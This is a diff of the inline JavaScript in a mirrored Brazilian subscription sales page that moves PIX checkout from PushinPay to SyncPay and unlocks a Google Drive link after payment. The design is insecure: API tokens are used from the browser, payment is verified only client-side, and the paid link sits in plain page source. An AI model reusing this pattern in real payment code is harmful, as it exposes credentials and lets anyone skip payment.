-        try {
-            // Converte valor para centavos
-            const valorCentavos = Math.round(valor * 100);
+            try {
+                // 1. Obtém o Token de Acesso
+                const token = await obterTokenSyncpay();
 
-            // Prepara o body da requisição
-            const body = {
-                value: valorCentavos
-            };
+                // 2. Prepara o body da requisição
+                const body = {
+                    amount: valor,
+                    description: descricao
+                };
 
-            // Adiciona webhook se configurado
-            if (WEBHOOK_URL_PUSHIN) {
-                body.webhook_url = WEBHOOK_URL_PUSHIN;
-            }
+                // Adiciona webhook se configurado
+                if (WEBHOOK_URL_SYNCPAY) {
+                    body.webhook_url = WEBHOOK_URL_SYNCPAY;
+                }
 
-            // Faz a requisição para a API
-            const response = await fetch(API_URL_PUSHIN, {
-                method: 'POST',
-                headers: {
-                    'Authorization': `Bearer ${PUSHINPAY_TOKEN}`,
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(body)
-            });
+                // 3. Faz a requisição para a API de Cash-in da SyncPay
+                const response = await fetch(API_URL_CASHIN, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(body)
+                });
 
-            const data = await response.json();
+                const data = await response.json();
 
-            if (response.ok && data.id) {
-                pagamentoAtualPushin = data;
-                mostrarQRCodePixPushin(data, descricao);
-                iniciarVerificacaoPagamentoPushin(data.id);
-            } else {
-                throw new Error(data.message || 'Erro ao gerar PIX');
-            }
+                if (response.ok && data.identifier) {
+                    pagamentoAtualSyncpay = {
+                        id: data.identifier,
+                        pix_code: data.pix_code,
+                        value: valor
+                    };
+                    mostrarQRCodePixSyncpay(pagamentoAtualSyncpay, descricao);
+                    iniciarVerificacaoPagamentoSyncpay(data.identifier);
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar PIX');
+                }
 
-        } catch (error) {
-            console.error('Erro:', error);
-            conteudo.innerHTML = `
+            } catch (error) {
+                console.error('Erro:', error);
+                conteudo.innerHTML = `
                 <h2 style="color: #e74c3c;">❌ Erro ao gerar PIX</h2>
                 <p style="color: #6c757d; margin: 20px 0;">
                     ${error.message || 'Não foi possível gerar o código PIX. Tente novamente.'}
                 </p>
-                <button class="btn-copiar-pix-pushin" onclick="fecharModalPixPushin()">
+                <button class="btn-copiar-pix-syncpay" onclick="fecharModalPixSyncpay()">
                     Fechar
                 </button>
             `;
-            mostrarToastPushin('Erro ao gerar PIX. Tente novamente.', 'error');
+                mostrarToastSyncpay('Erro ao gerar PIX. Tente novamente.', 'error');
+            }
         }
-    }
 
-    // Função para mostrar o QR Code
-    function mostrarQRCodePixPushin(dados, descricao) {
-        const conteudo = document.getElementById('conteudoPixModalPushin');
-        const valorReais = (dados.value / 100).toFixed(2).replace('.', ',');
+        // Função para mostrar o QR Code
+        function mostrarQRCodePixSyncpay(dados, descricao) {
+            const conteudo = document.getElementById('conteudoPixModalSyncpay');
+            const valorReais = dados.value.toFixed(2).replace('.', ',');
 
-        conteudo.innerHTML = `
+            // Gerador de QR Code usando API pública gratuita a partir do pix_code
+            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(dados.pix_code)}`;
+
+            conteudo.innerHTML = `
             <h2>Pagamento PIX</h2>
             <p style="color: #6c757d; margin: 10px 0; font-size: 15px;">${descricao}</p>
-            <div class="valor-pix-pushin">R$ ${valorReais}</div>
-            <span class="status-pix-pushin pendente">Aguardando Pagamento</span>
+            <div class="valor-pix-syncpay">R$ ${valorReais}</div>
+            <span class="status-pix-syncpay pendente">Aguardando Pagamento</span>
             
-            <div class="qr-code-box-pushin">
-                <img src="${dados.qr_code_base64}" alt="QR Code PIX">
+            <div class="qr-code-box-syncpay">
+                <img src="${qrCodeUrl}" alt="QR Code PIX">
             </div>
 
-            <div class="instrucoes-pix-pushin">
+            <div class="instrucoes-pix-syncpay">
                 <h3>📱 Como pagar:</h3>
                 <ol>
                     <li>Abra o app do seu banco</li>
@@ -873,307 +1021,314 @@
                 </ol>
             </div>
 
-            <div class="codigo-pix-container-pushin">
-                <label class="codigo-pix-label-pushin">Ou copie o código PIX:</label>
-                <div class="codigo-pix-box-pushin" id="codigoPixTextoPushin">${dados.qr_code}</div>
+            <div class="codigo-pix-container-syncpay">
+                <label class="codigo-pix-label-syncpay">Ou copie o código PIX:</label>
+                <div class="codigo-pix-box-syncpay" id="codigoPixTextoSyncpay">${dados.pix_code}</div>
             </div>
 
-            <button class="btn-copiar-pix-pushin" onclick="copiarCodigoPixPushin()">
+            <button class="btn-copiar-pix-syncpay" onclick="copiarCodigoPixSyncpay()">
                  Copiar Código PIX
             </button>
 
-            <button class="btn-verificar-pix-pushin" id="btnVerificarManualPushin" onclick="verificarPagamentoManualPushin()">
+            <button class="btn-verificar-pix-syncpay" id="btnVerificarManualSyncpay" onclick="verificarPagamentoManualSyncpay()">
                 Já Paguei - Verificar Status
             </button>
 
-            <div class="aviso-tempo-pushin">
+            <div class="aviso-tempo-syncpay">
                 ⏱️ O pagamento é confirmado automaticamente após a aprovação
             </div>
         `;
-    }
-
-    // Função para copiar o código PIX
-    function copiarCodigoPixPushin() {
-        if (!pagamentoAtualPushin) return;
-
-        navigator.clipboard.writeText(pagamentoAtualPushin.qr_code).then(() => {
-            mostrarToastPushin('✅ Código PIX copiado!');
-        }).catch(() => {
-            // Fallback
-            const textarea = document.createElement('textarea');
-            textarea.value = pagamentoAtualPushin.qr_code;
-            textarea.style.position = 'fixed';
-            textarea.style.opacity = '0';
-            document.body.appendChild(textarea);
-            textarea.select();
-            
-            try {
-                document.execCommand('copy');
-                mostrarToastPushin('✅ Código PIX copiado!');
-            } catch (err) {
-                mostrarToastPushin('❌ Erro ao copiar', 'error');
-            }
-            
-            document.body.removeChild(textarea);
-        });
-    }
-
-    // Inicia verificação automática
-    function iniciarVerificacaoPagamentoPushin(transactionId) {
-        intervaloVerificacaoPushin = setInterval(async () => {
-            await consultarStatusPagamentoPushin(transactionId);
-        }, 60000); // 60 segundos
-    }
-
-    // Consulta status do pagamento
-    async function consultarStatusPagamentoPushin(transactionId) {
-        const agora = Date.now();
-        
-        if (agora - ultimaConsultaPushin < 60000) {
-            console.log('Aguardando 1 minuto para próxima consulta...');
-            return;
         }
 
-        try {
-            ultimaConsultaPushin = agora;
+        // Função para copiar o código PIX
+        function copiarCodigoPixSyncpay() {
+            if (!pagamentoAtualSyncpay) return;
 
-            const response = await fetch(`${API_BASE_URL_PUSHIN}/${transactionId}`, {
-                method: 'GET',
-                headers: {
-                    'Authorization': `Bearer ${PUSHINPAY_TOKEN}`,
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
+            navigator.clipboard.writeText(pagamentoAtualSyncpay.pix_code).then(() => {
+                mostrarToastSyncpay('✅ Código PIX copiado!');
+            }).catch(() => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = pagamentoAtualSyncpay.pix_code;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+
+                try {
+                    document.execCommand('copy');
+                    mostrarToastSyncpay('✅ Código PIX copiado!');
+                } catch (err) {
+                    mostrarToastSyncpay('❌ Erro ao copiar', 'error');
                 }
-            });
 
-            if (response.status === 404) {
-                console.log('Transação não encontrada');
+                document.body.removeChild(textarea);
+            });
+        }
+
+        // Inicia verificação automática
+        function iniciarVerificacaoPagamentoSyncpay(identifier) {
+            // Limpa intervalo anterior se houver
+            if (intervaloVerificacaoSyncpay) {
+                clearInterval(intervaloVerificacaoSyncpay);
+            }
+            intervaloVerificacaoSyncpay = setInterval(async () => {
+                await consultarStatusPagamentoSyncpay(identifier);
+            }, 60000); // 60 segundos
+        }
+
+        // Consulta status do pagamento
+        async function consultarStatusPagamentoSyncpay(identifier) {
+            const agora = Date.now();
+
+            if (agora - ultimaConsultaSyncpay < 5000) { // Throttle de 5 segundos
+                console.log('Aguarde alguns segundos para a próxima consulta...');
                 return;
             }
 
-            if (response.ok) {
-                const data = await response.json();
-                
-                if (data.status === 'paid') {
-                    pagamentoAprovadoPushin(data);
-                } else if (data.status === 'expired') {
-                    pagamentoExpiradoPushin();
-                } else {
-                    console.log(`Status atual: ${data.status}`);
-                    atualizarStatusModalPushin(data.status);
+            try {
+                ultimaConsultaSyncpay = agora;
+                const token = await obterTokenSyncpay();
+
+                const response = await fetch(`${API_BASE_URL_SYNCPAY}/api/partner/v1/transaction/${identifier}`, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (response.status === 404) {
+                    console.log('Transação não encontrada');
+                    return;
                 }
+
+                if (response.ok) {
+                    const result = await response.json();
+                    const transaction = result.data;
+
+                    if (transaction.status === 'completed') {
+                        pagamentoAprovadoSyncpay(transaction);
+                    } else if (transaction.status === 'failed') {
+                        pagamentoExpiradoSyncpay();
+                    } else {
+                        console.log(`Status atual: ${transaction.status}`);
+                        atualizarStatusModalSyncpay(transaction.status);
+                    }
+                }
+
+            } catch (error) {
+                console.error('Erro ao consultar pagamento:', error);
+            }
+        }
+
+        // Atualiza status no modal
+        function atualizarStatusModalSyncpay(status) {
+            const statusElement = document.querySelector('.status-pix-syncpay');
+            if (!statusElement) return;
+
+            const statusConfig = {
+                'pending': { texto: '⏳ Aguardando Pagamento', classe: 'pendente' },
+                'completed': { texto: '✅ Pago', classe: 'pago' },
+                'failed': { texto: '❌ Falhou / Expirou', classe: 'pendente' },
+                'refunded': { texto: '↩️ Estornado', classe: 'pendente' },
+                'med': { texto: '⚠️ Bloqueio MED', classe: 'pendente' }
+            };
+
+            const config = statusConfig[status] || statusConfig['pending'];
+            statusElement.textContent = config.texto;
+            statusElement.className = `status-pix-syncpay ${config.classe}`;
+        }
+
+        // Verificação manual
+        async function verificarPagamentoManualSyncpay() {
+            if (!pagamentoAtualSyncpay) return;
+
+            const btn = document.getElementById('btnVerificarManualSyncpay');
+            if (!btn) return;
+
+            const textoOriginal = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = '🔄 Verificando...';
+
+            const agora = Date.now();
+            const tempoDecorrido = (agora - ultimaConsultaSyncpay) / 1000;
+
+            if (tempoDecorrido < 5 && ultimaConsultaSyncpay > 0) {
+                const segundosRestantes = Math.ceil(5 - tempoDecorrido);
+                mostrarToastSyncpay(`⏱️ Aguarde ${segundosRestantes}s`, 'error');
+                btn.disabled = false;
+                btn.innerHTML = textoOriginal;
+                return;
             }
 
-        } catch (error) {
-            console.error('Erro ao consultar pagamento:', error);
-        }
-    }
+            await consultarStatusPagamentoSyncpay(pagamentoAtualSyncpay.id);
 
-    // Atualiza status no modal
-    function atualizarStatusModalPushin(status) {
-        const statusElement = document.querySelector('.status-pix-pushin');
-        if (!statusElement) return;
-
-        const statusConfig = {
-            'created': { texto: '⏳ Aguardando Pagamento', classe: 'pendente' },
-            'pending': { texto: '⏳ Processando...', classe: 'pendente' },
-            'paid': { texto: '✅ Pago', classe: 'pago' },
-            'expired': { texto: '❌ Expirado', classe: 'pendente' }
-        };
-
-        const config = statusConfig[status] || statusConfig['created'];
-        statusElement.textContent = config.texto;
-        statusElement.className = `status-pix-pushin ${config.classe}`;
-    }
-
-    // Verificação manual
-    async function verificarPagamentoManualPushin() {
-        if (!pagamentoAtualPushin) return;
-
-        const btn = document.getElementById('btnVerificarManualPushin');
-        if (!btn) return;
-
-        const textoOriginal = btn.innerHTML;
-        btn.disabled = true;
-        btn.innerHTML = '🔄 Verificando...';
-
-        const agora = Date.now();
-        const tempoDecorrido = (agora - ultimaConsultaPushin) / 1000;
-
-        if (tempoDecorrido < 60 && ultimaConsultaPushin > 0) {
-            const segundosRestantes = Math.ceil(60 - tempoDecorrido);
-            mostrarToastPushin(`⏱️ Aguarde ${segundosRestantes}s`, 'error');
-            btn.disabled = false;
-            btn.innerHTML = textoOriginal;
-            return;
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = textoOriginal;
+            }, 1000);
         }
 
-        await consultarStatusPagamentoPushin(pagamentoAtualPushin.id);
+        // Pagamento aprovado
+        function pagamentoAprovadoSyncpay(dados) {
+            if (intervaloVerificacaoSyncpay) {
+                clearInterval(intervaloVerificacaoSyncpay);
+            }
 
-        setTimeout(() => {
-            btn.disabled = false;
-            btn.innerHTML = textoOriginal;
-        }, 2000);
-    }
+            const valorReais = dados ? dados.amount.toFixed(2).replace('.', ',') : '0,00';
+            const conteudo = document.getElementById('conteudoPixModalSyncpay');
 
-    // Pagamento aprovado
-// Pagamento aprovado - ATUALIZADO COM LINK DO DRIVE
-function pagamentoAprovadoPushin(dados) {
-    if (intervaloVerificacaoPushin) {
-        clearInterval(intervaloVerificacaoPushin);
-    }
+            // Link do Google Drive liberado
+            const linkDrive = 'https://drive.google.com/drive/folders/1M5toLuYb9JKXOnh3cz_zodyJwif57lLS';
 
-    const valorReais = dados ? (dados.value / 100).toFixed(2).replace('.', ',') : '0,00';
-    const conteudo = document.getElementById('conteudoPixModalPushin');
-    
-    // Link do Google Drive
-    const linkDrive = 'https://drive.google.com/drive/folders/1M5toLuYb9JKXOnh3cz_zodyJwif57lLS';
-    
-    conteudo.innerHTML = `
-        <div style="padding: 30px 0;">
-            <div style="font-size: 70px; margin-bottom: 15px;">✅</div>
-            <h2 style="color: #27ae60; margin-bottom: 10px;">Pagamento Confirmado!</h2>
-            <p style="color: #6c757d; margin: 15px 0; font-size: 16px;">
-                <strong>R$ ${valorReais}</strong>
-            </p>
-            <p style="color: #6c757d; margin: 15px 0; font-size: 14px;">
-                Seu pagamento foi aprovado com sucesso!<br>
-                Clique no botão abaixo para acessar o conteúdo exclusivo.
-            </p>
-
-            <div style="background: #e8f5e9; padding: 15px; border-radius: 10px; margin: 20px 0;">
-                <p style="color: #2e7d32; font-size: 13px; margin: 0;">
-                    🔒 <strong>Acesso Liberado!</strong><br>
-                    Seu conteúdo exclusivo está disponível.
+            conteudo.innerHTML = `
+            <div style="padding: 30px 0;">
+                <div style="font-size: 70px; margin-bottom: 15px;">✅</div>
+                <h2 style="color: #27ae60; margin-bottom: 10px;">Pagamento Confirmado!</h2>
+                <p style="color: #6c757d; margin: 15px 0; font-size: 16px;">
+                    <strong>R$ ${valorReais}</strong>
                 </p>
-            </div>
+                <p style="color: #6c757d; margin: 15px 0; font-size: 14px;">
+                    Seu pagamento foi aprovado com sucesso!<br>
+                    Clique no botão abaixo para acessar o conteúdo exclusivo.
+                </p>
 
-            <a href="${linkDrive}" target="_blank" style="text-decoration: none;">
-                <button class="btn-copiar-pix-pushin" style="background: linear-gradient(135deg, #27ae60 0%, #229954 100%); box-shadow: 0 6px 15px rgba(39, 174, 96, 0.4);">
-                    🎁 Acessar Conteúdo Agora
+                <div style="background: #e8f5e9; padding: 15px; border-radius: 10px; margin: 20px 0;">
+                    <p style="color: #2e7d32; font-size: 13px; margin: 0;">
+                        🔒 <strong>Acesso Liberado!</strong><br>
+                        Seu conteúdo exclusivo está disponível.
+                    </p>
+                </div>
+
+                <a href="${linkDrive}" target="_blank" style="text-decoration: none;">
+                    <button class="btn-copiar-pix-syncpay" style="background: linear-gradient(135deg, #27ae60 0%, #229954 100%); box-shadow: 0 6px 15px rgba(39, 174, 96, 0.4);">
+                        🎁 Acessar Conteúdo Agora
+                    </button>
+                </a>
+
+                <button class="btn-verificar-pix-syncpay" onclick="copiarLinkDriveSyncpay('${linkDrive}')" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+                    📋 Copiar Link
                 </button>
-            </a>
 
-            <button class="btn-verificar-pix-pushin" onclick="copiarLinkDrive('${linkDrive}')" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
-                📋 Copiar Link
-            </button>
+                <button class="btn-verificar-pix-syncpay" onclick="fecharModalPixSyncpay()" style="background: #95a5a6; margin-top: 10px;">
+                    Fechar
+                </button>
 
-            <button class="btn-verificar-pix-pushin" onclick="fecharModalPixPushin()" style="background: #95a5a6; margin-top: 10px;">
-                Fechar
-            </button>
-
-            <div class="aviso-tempo-pushin" style="margin-top: 15px;">
-                💡 Salve o link em seus favoritos para acessar quando quiser!
+                <div class="aviso-tempo-syncpay" style="margin-top: 15px;">
+                    💡 Salve o link em seus favoritos para acessar quando quiser!
+                </div>
             </div>
-        </div>
-    `;
+        `;
 
-    mostrarToastPushin('✅ Pagamento aprovado! Acesse seu conteúdo.');
-}
-
-// Função para copiar o link do Drive
-function copiarLinkDrive(link) {
-    navigator.clipboard.writeText(link).then(() => {
-        mostrarToastPushin('✅ Link copiado! Cole no navegador para acessar.');
-    }).catch(() => {
-        // Fallback para navegadores antigos
-        const textarea = document.createElement('textarea');
-        textarea.value = link;
-        textarea.style.position = 'fixed';
-        textarea.style.opacity = '0';
-        document.body.appendChild(textarea);
-        textarea.select();
-        
-        try {
-            document.execCommand('copy');
-            mostrarToastPushin('✅ Link copiado!');
-        } catch (err) {
-            mostrarToastPushin('❌ Erro ao copiar', 'error');
-        }
-        
-        document.body.removeChild(textarea);
-    });
-}
-
-    // Pagamento expirado
-    function pagamentoExpiradoPushin() {
-        if (intervaloVerificacaoPushin) {
-            clearInterval(intervaloVerificacaoPushin);
+            mostrarToastSyncpay('✅ Pagamento aprovado! Acesse seu conteúdo.');
         }
 
-        const conteudo = document.getElementById('conteudoPixModalPushin');
-        conteudo.innerHTML = `
+        // Função para copiar o link do Drive
+        function copiarLinkDriveSyncpay(link) {
+            navigator.clipboard.writeText(link).then(() => {
+                mostrarToastSyncpay('✅ Link copiado! Cole no navegador para acessar.');
+            }).catch(() => {
+                // Fallback para navegadores antigos
+                const textarea = document.createElement('textarea');
+                textarea.value = link;
+                textarea.style.position = 'fixed';
+                textarea.style.opacity = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+
+                try {
+                    document.execCommand('copy');
+                    mostrarToastSyncpay('✅ Link copiado!');
+                } catch (err) {
+                    mostrarToastSyncpay('❌ Erro ao copiar', 'error');
+                }
+
+                document.body.removeChild(textarea);
+            });
+        }
+
+        // Pagamento expirado
+        function pagamentoExpiradoSyncpay() {
+            if (intervaloVerificacaoSyncpay) {
+                clearInterval(intervaloVerificacaoSyncpay);
+            }
+
+            const conteudo = document.getElementById('conteudoPixModalSyncpay');
+            conteudo.innerHTML = `
             <div style="padding: 40px 0;">
-                <div style="font-size: 80px; margin-bottom: 20px;">⏰</div>
-                <h2 style="color: #e74c3c;">Pagamento Expirado</h2>
+                <div style="font-size: 80px; margin-bottom: 20px;">❌</div>
+                <h2 style="color: #e74c3c;">Pagamento não Concluído</h2>
                 <p style="color: #6c757d; margin: 20px 0;">
-                    O tempo expirou. Gere um novo código PIX.
+                    A transação expirou ou falhou. Por favor, tente gerar um novo código PIX.
                 </p>
-                <button class="btn-copiar-pix-pushin" onclick="fecharModalPixPushin()">
+                <button class="btn-copiar-pix-syncpay" onclick="fecharModalPixSyncpay()">
                     Fechar
                 </button>
             </div>
         `;
 
-        mostrarToastPushin('⏰ Pagamento expirado', 'error');
-    }
-
-    // Fechar modal
-    function fecharModalPixPushin() {
-        const modal = document.getElementById('modalPixPushin');
-        modal.classList.remove('active');
-        document.body.style.overflow = ''; // Libera scroll
-        
-        if (intervaloVerificacaoPushin) {
-            clearInterval(intervaloVerificacaoPushin);
+            mostrarToastSyncpay('❌ Pagamento expirado ou falhou', 'error');
         }
-        
-        pagamentoAtualPushin = null;
-    }
 
-    // Mostrar toast
-    function mostrarToastPushin(mensagem, tipo = 'success') {
-        const toast = document.getElementById('toastMessagePushin');
-        toast.textContent = mensagem;
-        toast.className = `toast-message-pushin ${tipo}`;
-        toast.classList.add('show');
+        // Fechar modal
+        function fecharModalPixSyncpay() {
+            const modal = document.getElementById('modalPixSyncpay');
+            modal.classList.remove('active');
+            document.body.style.overflow = ''; // Libera scroll
 
-        setTimeout(() => {
-            toast.classList.remove('show');
-        }, 3000);
-    }
+            if (intervaloVerificacaoSyncpay) {
+                clearInterval(intervaloVerificacaoSyncpay);
+            }
 
-    // Fecha ao clicar fora
-    document.getElementById('modalPixPushin').addEventListener('click', (e) => {
-        if (e.target.id === 'modalPixPushin') {
-            fecharModalPixPushin();
+            pagamentoAtualSyncpay = null;
         }
-    });
 
-    // Fecha com ESC
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'Escape' && document.getElementById('modalPixPushin').classList.contains('active')) {
-            fecharModalPixPushin();
+        // Mostrar toast
+        function mostrarToastSyncpay(mensagem, tipo = 'success') {
+            const toast = document.getElementById('toastMessageSyncpay');
+            toast.textContent = mensagem;
+            toast.className = `toast-message-syncpay ${tipo}`;
+            toast.classList.add('show');
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
         }
-    });
 
-    // ========================================
-    // SUBSTITUI SUAS FUNÇÕES ANTIGAS:
-    // ========================================
-    
-    function redirecionar1() {
-        criarPagamentoPixPushin(24.90, 'Assinar (30 dias)');
-    }
+        // Fecha ao clicar fora
+        document.getElementById('modalPixSyncpay').addEventListener('click', (e) => {
+            if (e.target.id === 'modalPixSyncpay') {
+                fecharModalPixSyncpay();
+            }
+        });
 
-    function redirecionar2() {
-        criarPagamentoPixPushin(39.90, 'Assinar (60 dias)');
-    }
+        // Fecha com ESC
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && document.getElementById('modalPixSyncpay').classList.contains('active')) {
+                fecharModalPixSyncpay();
+            }
+        });
 
-    function redirecionar3() {
-        criarPagamentoPixPushin(59.90, 'Assinar (90 dias)');
-    }
-</script>
-			 
-		 </body>
+        // ========================================
+        // SUBSTITUI SUAS FUNÇÕES DE CLIQUE:
+        // ========================================
+
+        function redirecionar1() {
+            criarPagamentoPixSyncpay(24.90, 'Assinar (30 dias)');
+        }
+
+        function redirecionar2() {
+            criarPagamentoPixSyncpay(39.90, 'Assinar (60 dias)');
+        }
+
+        function redirecionar3() {
+            criarPagamentoPixSyncpay(59.90, 'Assinar (90 dias)');
+        }
+    </script>
+
+</body>
 <!-- Mirrored from digitalwebofc.shop/kamilinhapriv/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Mar 2025 13:03:03 GMT -->
+
 </html>
